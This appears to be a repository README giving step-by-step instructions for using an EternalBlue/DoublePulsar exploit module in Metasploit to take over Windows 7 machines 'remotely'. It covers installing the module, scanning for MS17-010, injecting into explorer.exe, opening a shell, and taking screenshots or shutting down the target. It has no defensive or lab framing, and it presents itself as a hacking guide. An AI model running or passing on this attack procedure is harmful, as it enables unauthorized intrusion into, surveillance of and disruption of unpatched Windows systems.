# Eternalblue-Doublepulsar-Metasploit
for windows 7 hacking remontly
Link Youtube : https://www.youtube.com/watch?v=EFDYZSRdofk

git clone 
cd folder
sudo cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
msfconsole
use auxiliary/scanner/smb/smb_ms17_010   ===========>>> check for vulnerability
run
bach
use exploit/windows/smb/eternalblue_doublepulsar
set PROCESSINJECT explorer.exe
exploit
win>shell
win>systeminfo - ps - screenshot - shutdown
